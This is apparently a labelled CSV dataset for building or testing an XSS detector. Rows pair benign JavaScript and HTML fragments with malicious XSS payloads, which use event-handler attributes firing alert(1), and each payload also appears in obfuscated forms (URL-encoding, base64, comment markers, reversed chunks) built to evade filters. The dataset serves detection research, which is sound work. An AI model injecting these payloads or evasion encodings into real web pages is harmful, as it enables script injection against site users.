sample_id,label,payload_original,payload_obfuscated,generator,recipe
706,1,"<style>:target {color: red;}</style><em id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></em>",%25253Cstyle%25253E%25253Atarget%252520%25257Bcolor%25253A%252520red%25253B%25257D%25253C%25252Fstyle%25253E%25253Cem%252520id%25253Dx%252520style%25253D%252522transition%25253Acolor%25252010s%252522%252520ontransitioncancel%25253Dalert%2525281%252529%25253E%25253C%25252Fem%25253E,llm_style_t1.5,double_urlencode+html_entities+urlencode
707,1,<data onpointerleave=alert(1)>xss</data>,%3EFdata%3C%23Exss1%29%rt%283Daleeave%nterlonpoita%20%3Cda,llm_style_t1.5,urlencode+whitespace_noise+reverse_chunks
708,0,const callable = isdelegated ? delegationfunction : handler || delegationfunction; let typeevent = gettypeevent(originaltypeevent); if (!nativeevents.has(typeevent)) {,const callable = isdelegated ? delegationfunction : handler || delegationfunction; let typeevent = gettypeevent(originaltypeevent); if (!nativeevents.has(typeevent)) {,llm_style_t1.5,none
709,0,animoptions.translatex = -100; } anim(animoptions);,animoptions.translatex = -100; } anim(animoptions);,llm_style_t1.5,none
710,0,this.originalwidth = this.el.getboundingclientrect().width,this.originalwidth = this.el.getboundingclientrect().width,llm_style_t1.5,none
711,1,"<td onkeypress=""alert(1)"" contenteditable>test</td>",%3Ctd%20onkeypress%3D%22alert%281%29%22%20contenteditab%2F%2AOBF%2A%2Fle%3Etest%3C%2Ftd%3E,llm_style_t1.5,comment_marker+urlencode
712,0,var resultdiv = $('<a href=' + result[1] + '>' + result[0] + '</a>'); resultscontainer.append(resultdiv); });,var resultdiv = $('<a href=' + result[1] + '>' + result[0] + '</a>'); resultscontainer.append(resultdiv); });,llm_style_t1.5,none
713,1,"<acronym oncut=""alert(1)"" contenteditable>test</acronym>","<acro/*OBF*/nym/  *OBF*/ oncut=""alert(  1)"" contenteditable> t/*OBF*/est</acronym>",llm_style_t1.5,comment_marker
714,0,m.timepicker = timepicker,m.timepicker = timepicker,llm_style_t1.5,none
715,0,calendar.month += 12,calendar.month += 12,llm_style_t1.5,none
716,1,<img src=validimage.png onloadend=alert(1)>,&lt;img/*OBF*  / src=validimage.png onloadend=alert(1)&gt;,llm_style_t1.5,html_entities+comment_marker+whitespace_noise
717,1,"<style>@keyframes slidein {}</style><cite style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></cite>",JTI1M0NzdHlsZSUyNTNFJTI1NDBrZXlmcmFtZXMlMjUyMH/*OBF*/NsaWRlaW4lMjUyMCUyNTdCJTI1N0QlMjU/*OBF*/zQyUyNTJGc3R5bGUlMjUzRSUyNTNDY2l0ZS/*OBF*/UyNTIwc3R5bGUlMjUzRCUyN/*OBF*/TIyYW5pbWF0aW9uLWR1cmF0aW9uJTI1M0ExcyUyNTNCYW5pbWF0aW9uLW5hbWUlMjUzQXNsaWRlaW4lMjUzQmFuaW1hdGlvb/*OBF*/i1pdGVyYXRpb24tY291bnQlMjUzQTIlMjUyMiUyNTIwb25hbmltYXRpb25pdGVyYXRpb24lMjUzRCUyNTIyYWxlcnQlMjUyODEl/*OBF*/MjUyOSUyNTIyJTI1M0UlMjUzQyUyNTJGY2l0ZSUyNTNF,llm_style_t1.5,urlencode+html_then_urlencode+base64
718,0,}); if (this.showindicators) { this.$el.append(this.$indicators);,}); if (this.showindicators) { this.$el.append(this.$indicators);,llm_style_t1.5,none
719,1,<shadow onpointerenter=alert(1)>xss</shadow>,<shadow onpointerenter=alert(1)> xss</shadow>,llm_style_t1.5,whitespace_noise
720,1,"<style>:target {color: red;}</style><details id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></details>",JTNDc3R5bGUlM0UlM0F0YXJnZXQlMjAlN0Jjb2xvciUzQSUyMHJlZCUzQiU3RCUzQyUyRnN0eWxlJTNFJTNDZGV0YWlscyUyMGlkJTNEeCUyMHN0eWxlJTNEJTIydHJhbnNpdGlvbiUzQWNvbG9yJTIwMTBzJTIyJTIwb250cmFuc2l0aW9uY2FuY2VsJTNEYWxlcnQlMjgxJTI5JTNFJTNDJTJGZGV0YWlscyUzRQ==,llm_style_t1.5,urlencode+base64
721,0,"_classcallcheck(this, taptarget)","_classcallcheck(this, taptarget)",llm_style_t1.5,none
722,1,"<data onmouseenter=""alert(1)"">test</data>",PGRhdGEgb25tb3VzZWVudGVyPSJhbGVydCgxKSI+dGVzdDwvZGF0YT4=,llm_style_t1.5,base64+whitespace_noise
723,0,this._deltax = 0 this._supportpointerevents = boolean(window.pointerevent) this._initevents(),this._deltax = 0 this._supportpointerevents = boolean(window.pointerevent) this._initevents(),llm_style_t1.5,none
724,1,"<style draggable=""true"" ondragleave=""alert(1)"">test</style>",%25253Cstyle%252520draggable%25253D%252522true%252522%252520ondragleave%25253D%252522alert%2525281%252529%252522%25253Etest%25253C%25252Fstyle%25253E,llm_style_t1.5,double_urlencode+urlencode
725,0,} } return elementisvisible;,} } return elementisvisible;,llm_style_t1.5,none
726,1,<nav onpointerenter=alert(1)>xss</nav>,<nav onpoint/  *OBF*/erenter=alert(1)>xss</nav>,llm_style_t1.5,comment_marker
727,1,"<iframe onmouseup=""alert(1)"">test</iframe>",me%253Eifrat%253C%2520%252F%253Etes%25281%2529%2522lertp%253D%2522auseuonmoame%2520%253Cifr,llm_style_t1.5,whitespace_noise+reverse_chunks+double_urlencode
728,0,_this35._handlewindowscroll(); return _this35; },_this35._handlewindowscroll(); return _this35; },llm_style_t1.5,none
729,0,}; }; spectrum.prototype.countstepdecimals = function () {,}; }; spectrum.prototype.countstepdecimals = function () {,llm_style_t1.5,none
730,1,"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable>drop here</tfoot>",%26amp%3Blt%3Bdiv%20draggable%3D%26amp%3Bquot%3Btrue%26amp%3Bquot%3B%20contenteditable%26amp%3Bgt%3Bdrag%20me%26amp%3Blt%3B%2Fdiv%26amp%3Bgt%3B%26amp%3Blt%3Btfoot%20ondrop%3Dalert%281%29%20contenteditable%26amp%3Bgt%3Bdrop%20here%26amp%3Blt%3B%2Ftfoot%26amp%3Bgt%3B,llm_style_t1.5,html_entities+html_then_urlencode
731,1,<svg><discard onbegin=alert(1)>,PHN2Zz48ZGlzY2FyZCBvbmJlZ2luPWFsZXJ0KDEpPg==,llm_style_t1.5,whitespace_noise+base64+html_entities
732,0,return new focustrap({ trapelement: this._element }),return new focustrap({ trapelement: this._element }),llm_style_t1.5,none
733,0,this.tabswidth = this.$el.width(),this.tabswidth = this.$el.width(),llm_style_t1.5,none
734,1,"<bgsound draggable=""true"" ondragend=""alert(1)"">test</bgsound>",%3Cbgsound%20draggable%3D%22true%22%20ondragend%3D%22alert%281%29%22%3Etest%3C%2Fbgsound%3E,llm_style_t1.5,urlencode
735,1,"<a href=""http://66.102.7.147/""></a>",PGEgaHJlZj0iaHR0cDovLzY2LjEwMi43LjE0Ny8iPjwvYT4=,llm_style_t1.5,base64
736,1,"<iframe onbeforecopy=""alert(1)"" contenteditable>test</iframe>",%3Ciframe%20onbeforecopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fiframe%3E,llm_style_t1.5,urlencode
737,0,const event_pointerup = `pointerup${event_key$9}`; const pointer_type_touch = 'touch'; const pointer_type_pen = 'pen';,const event_pointerup = `pointerup${event_key$9}`; const pointer_type_touch = 'touch'; const pointer_type_pen = 'pen';,llm_style_t1.5,none
738,0,const selector_nav_items = '.nav-item',const selector_nav_items = '.nav-item',llm_style_t1.5,none
739,0,const event_keydown_data_api = `keydown${event_key$6}${data_api_key$3}`,const event_keydown_data_api = `keydown${event_key$6}${data_api_key$3}`,llm_style_t1.5,none
740,1,"<style>:target {color:red;}</style><mark id=x style=""transition:color 1s"" ontransitionend=alert(1)></mark>",PHN0eWxlPjp0YXJnZX/*OBF*/Qge2NvbG9yOnJlZDt9PC9zdHlsZT48bWFyayBpZD14IHN0eWxlPSJ0cmFuc2l0aW9uOmNvbG9yIDFzIiBvbnRyYW5zaXRpb25lbmQ9YWxlcnQoMSk+PC9tYXJrPg==,llm_style_t1.5,base64+whitespace_noise
741,0,} domcontentloadedcallbacks.push(callback); } else {,} domcontentloadedcallbacks.push(callback); } else {,llm_style_t1.5,none
742,1,"<style>@keyframes x{}</style><details style=""animation-name:x"" onanimationstart=""alert(1)""></details>",JTNDc3R5bGUlM0UlMjAlNDBrZXlmcmFtZXMlMjB4JTdCJTdEJTNDJTJGJTIwJTIwc3R5bGUlM0UlM0NkZXRhaWxzJTIwc3R5bGUlM0QlMjJhbmltYXRpb24tbmFtZSUzQXglMjIlMjBvbmFuaW1hdGlvbnN0YXJ0JTNEJTIyYWxlcnQlMjgxJTI5JTIyJTNFJTIwJTNDJTJGZGV0YWlscyUzRQ==,llm_style_t1.5,whitespace_noise+urlencode+base64
743,0,this.yeartextel = this.modalel.queryselector('.year-text'),this.yeartextel = this.modalel.queryselector('.year-text'),llm_style_t1.5,none
744,0,"</span> <span class=""reference-text""><a href=""#citerefnorvig2012"">norvig 2012 </a>.","</span> <span class=""reference-text""><a href=""#citerefnorvig2012"">norvig 2012 </a>.",llm_style_t1.5,none
745,1,"<center ondblclick=""alert(1)"">test</center>",%2526amp%253Blt%253Bcenter%2520ondblclick%253D%2526amp%253Bquot%253Balert%25281%2529%2526amp%253Bquot%253B%2526amp%253Bgt%253Btest%2526amp%253Blt%253B%252Fcenter%2526amp%253Bgt%253B,llm_style_t1.5,html_entities+html_then_urlencode+urlencode
746,1,"<style>@keyframes x{}</style><meter style=""animation-name:x"" onanimationend=""alert(1)""></meter>","/meter>rt(1)""><end=""alenimatione:x"" onation-name=""animater styltyle><mes x{}</  skeyframe<  style>@",llm_style_t1.5,reverse_chunks
747,0,if (_this18.attrheight) {,if (_this18.attrheight) {,llm_style_t1.5,none
748,1,"<textarea onmouseleave=""alert(1)"">test</textarea>",%2526lt%253Btextarea%2520onmouseleave%253D%2526quot%253Balert%25281%2529%2526quot/*OBF*/%253B%2526gt%253Btest%2526lt%253B%252Ftextarea%2526gt%253B,llm_style_t1.5,html_entities+double_urlencode
749,1,"<font onkeyup=""alert(1)"" contenteditable>test</font>",%253Cfont%2520onkeyup%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Ffont%253E,llm_style_t1.5,double_urlencode
750,1,"<font onmousemove=""alert(1)"">test</font>",3EFfont%t%3C%2%3Etes%29%22rt%281%22aleove%3Dmousemt%20on%3Cfon,llm_style_t1.5,urlencode+reverse_chunks
751,0,"<div id=""p-logo"" role=""banner"">","<div id=""p-logo"" role=""banner"">",llm_style_t1.5,none
752,0,const relatedtarget = {,const relatedtarget = {,llm_style_t1.5,none
753,1,"<style>@keyframes x{}</style><rp style=""animation-name:x"" onanimationstart=""alert(1)""></rp>",rp%3Et%281%29%22%3E%3C%2Frt%3D%22alerationsta%22%20onanimn-name%3Axanimatio%20style%3D%22tyle%3E%3Crps%20x%7B%7D%3C%2Fskeyframe%3Cstyle%3E%40,llm_style_t1.5,reverse_chunks+urlencode+html_entities
754,0,dist: { files: { 'dist/js/materialize.min.js': ['dist/js/materialize.js'],dist: { files: { 'dist/js/materialize.min.js': ['dist/js/materialize.js'],llm_style_t1.5,none
755,1,"<img onmouseenter=""alert(1)"">test</img>",%3Cimg%20onmou/*OBF*/seent/*OBF*/  er%3D%22alert%281%29%22%3Etest%3C%2Fimg%3E,llm_style_t1.5,urlencode+comment_marker
756,0,multi-agent planning and emergent behavior:,multi-agent planning and emergent behavior:,llm_style_t1.5,none
757,0,this._calculatepositioning(); this._setupeventhandlers(); },this._calculatepositioning(); this._setupeventhandlers(); },llm_style_t1.5,none
758,0,parsed.tooltips.push(true),parsed.tooltips.push(true),llm_style_t1.5,none
759,0,if (opts.isdisabled) { arr.push('is-disabled'); },if (opts.isdisabled) { arr.push('is-disabled'); },llm_style_t1.5,none
760,0,for (const carousel of carousels) {,for (const carousel of carousels) {,llm_style_t1.5,none
761,0,"m.updatetextfields(); }); $(document).on('reset', function(e) {","m.updatetextfields(); }); $(document).on('reset', function(e) {",llm_style_t1.5,none
762,0,"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 18.2 </li> </ul>","<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 18.2 </li> </ul>",llm_style_t1.5,none
763,0,}; m.getoverflowparent = function (element) { if (element == null) {,}; m.getoverflowparent = function (element) { if (element == null) {,llm_style_t1.5,none
764,1,<bgsound onpointerleave=alert(1)>xss</bgsound>,&lt;bgsound onpointerleave=alert(1)&gt;xss&lt;/bgsound&gt;,llm_style_t1.5,html_entities
765,0,$activelis.each(function (el) { var index = $collapsiblelis.index($(el)); _this8.close(index);,$activelis.each(function (el) { var index = $collapsiblelis.index($(el)); _this8.close(index);,llm_style_t1.5,none
766,0,"key: ""_renderchips"", value: function _renderchips() { this.$chips.remove();","key: ""_renderchips"", value: function _renderchips() { this.$chips.remove();",llm_style_t1.5,none
767,1,"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>",%3Cdiv%20draggabl/*OBF*/e%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Cb/*OBF*/do%20ondragover%3Dalert%281%29%20contenteditab/*OBF*/le%3Edrop%20here%3C%2Fbdo%3E,llm_style_t1.5,urlencode+comment_marker
768,0,"} subclass.prototype = object.create(superclass && superclass.prototype, { constructor: { value: subclass, enumerable: false, writable: true, configurable: true } })","} subclass.prototype = object.create(superclass && superclass.prototype, { constructor: { value: subclass, enumerable: false, writable: true, configurable: true } })",llm_style_t1.5,none
769,0,this.isopen = false; this.modal.close(); },this.isopen = false; this.modal.close(); },llm_style_t1.5,none
770,0,"<li id=""cite_note-305""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-305"">^ </a> </b>","<li id=""cite_note-305""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-305"">^ </a> </b>",llm_style_t1.5,none
771,0,} to = options.format.from(to); if ( to !== false && !isnan(to) ) {,} to = options.format.from(to); if ( to !== false && !isnan(to) ) {,llm_style_t1.5,none
772,1,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>","<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcap/*OBF* /ti/*OBF*/on id=x style=""position:absolute; "" onanimationcancel=""alert(1)""></figcaption>",llm_style_t1.5,comment_marker
773,1,"<script oncopy=""alert(1)"" contenteditable>test</script>",Jmx0O3NjcmlwdCBvbmNvcHk9JnF1b3Q7YWxlcnQoMSkmcXVvdDsgY29udGVudGVkaXRhYmxlJmd0O3Rlc3QmbHQ7L3NjcmlwdCZndDs=,llm_style_t1.5,whitespace_noise+html_entities+base64
774,1,"<big ondblclick=""alert(1)"">test</big>",PGJpZyBvbmRibGNsaWNrPSJhbGVydCgxKSI%252BdGVzdDwvYmlnPg%253D%253D,llm_style_t1.5,base64+double_urlencode
775,0,} _isanimated() { return this._config.animation || (this.tip && this.tip.classlist.contains(class_name_fade)),} _isanimated() { return this._config.animation || (this.tip && this.tip.classlist.contains(class_name_fade)),llm_style_t1.5,none
776,0,"let registry = { autocomplete: root.queryselectorall('.autocomplete:not(.no-autoinit)'), carousel: root.queryselectorall('.carousel:not(.no-autoinit)'),","let registry = { autocomplete: root.queryselectorall('.autocomplete:not(.no-autoinit)'), carousel: root.queryselectorall('.carousel:not(.no-autoinit)'),",llm_style_t1.5,none
777,0,"<li id=""cite_note-377""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-377"">^ </a> </b>","<li id=""cite_note-377""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-377"">^ </a> </b>",llm_style_t1.5,none
778,1,<time id=x tabindex=1 onbeforedeactivate=alert(1)></time><input autofocus>,JTNDdGltZSUyMGlkJTNEeCUyMHRhYmluZGV4JTNEMSUyMG9uYmVmb3JlZGVhY3RpdmF0ZSUzRGFsZXJ0JTI4MSUyOSUzRSUzQyUyRnRpbWUlM0UlM0NpbnB1dCUyMGF1dG9mb2N1cyUzRQ==,llm_style_t1.5,urlencode+base64
779,0,"instance[methodoroptions].apply(instance, params)","instance[methodoroptions].apply(instance, params)",llm_style_t1.5,none
780,1,"<tt draggable=""true"" ondragenter=""alert(1)"">test</tt>","<tt draggable=""t/*OBF*/ru/*OBF*/e"" ondragenter=""alert(1)"">test</tt>",llm_style_t1.5,comment_marker
781,1,"<style>:target {color:red;}</style><noscript id=x style=""transition:color 1s"" ontransitionend=alert(1)></noscript>",%26lt%3Bstyle%26gt%3B%3Atarget%20%7Bcolor%3Ared%3B%7D%26lt%3B%2Fstyle%26gt%3B%26lt%3Bnoscr/*OBF*/ipt%20id%3Dx%20style%3D%26quot%3Btransition%3Acolor%201s%26quot%3B%20ontransit/*  OBF*/ionend%3D/*OBF*/alert%281%29%26gt%3B%26lt%3B%2Fnoscript%26gt%3B,llm_style_t1.5,html_then_urlencode+comment_marker
782,0,"if (p.get || p.set) throw new typeerror(""es3 does not support getters and setters."");e != array.prototype && e != object.prototype && (e[r] = p.value); };$jscomp.getglobal = function (e) { return ""undefined"" != typeof window && window === e ? e : ""undefined"" != typeof global && null != global ? global : e;","if (p.get || p.set) throw new typeerror(""es3 does not support getters and setters."");e != array.prototype && e != object.prototype && (e[r] = p.value); };$jscomp.getglobal = function (e) { return ""undefined"" != typeof window && window === e ? e : ""undefined"" != typeof global && null != global ? global : e;",llm_style_t1.5,none
783,0,this._focustrap.deactivate(),this._focustrap.deactivate(),llm_style_t1.5,none
784,1,"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationstart=""alert(1)""></img>",%2526lt%253Bstyle%2526gt%253B%2540keyframes%2520x%257B%257D%2526lt%253B%252Fstyle%2526gt%253B%2526lt%253Bimg%2520style%253D%2526quot%253Banimation-name%253Ax%2526quot%253B%2520onanimationstart%253D%2526quot%253Balert%25281%2529%2526quot%253B%2526gt%253B%2526lt%253B%252Fimg%2526gt%253B,llm_style_t1.5,html_entities+double_urlencode
785,0,return (value === undefined ? this[0][name] : this.each(function (v) { v[name] = value; }));,return (value === undefined ? this[0][name] : this.each(function (v) { v[name] = value; }));,llm_style_t1.5,none
786,0,"</p><p>worldwide annual military spending on robotics rose from us$5.1 billion in 2010 to us$7.5 billion in 2015.<sup id=""cite_ref-332"" class=""reference""><a href=""#cite_note-332"">&#91;321&#93; </a> </sup><sup id=""cite_ref-333"" class=""reference""><a href=""#cite_note-333"">&#91;322&#93; </a> </sup> military drones capable of autonomous action are widely considered a useful asset.<sup id=""cite_ref-334"" class=""reference""><a href=""#cite_note-334"">&#91;323&#93; </a> </sup> many artificial intelligence researchers seek to distance themselves from military applications of ai.<sup id=""cite_ref-335"" class=""reference""><a href=""#cite_note-335"">&#91;324&#93; </a> </sup>","</p><p>worldwide annual military spending on robotics rose from us$5.1 billion in 2010 to us$7.5 billion in 2015.<sup id=""cite_ref-332"" class=""reference""><a href=""#cite_note-332"">&#91;321&#93; </a> </sup><sup id=""cite_ref-333"" class=""reference""><a href=""#cite_note-333"">&#91;322&#93; </a> </sup> military drones capable of autonomous action are widely considered a useful asset.<sup id=""cite_ref-334"" class=""reference""><a href=""#cite_note-334"">&#91;323&#93; </a> </sup> many artificial intelligence researchers seek to distance themselves from military applications of ai.<sup id=""cite_ref-335"" class=""reference""><a href=""#cite_note-335"">&#91;324&#93; </a> </sup>",llm_style_t1.5,none
787,0,const name$5 = 'templatefactory',const name$5 = 'templatefactory',llm_style_t1.5,none
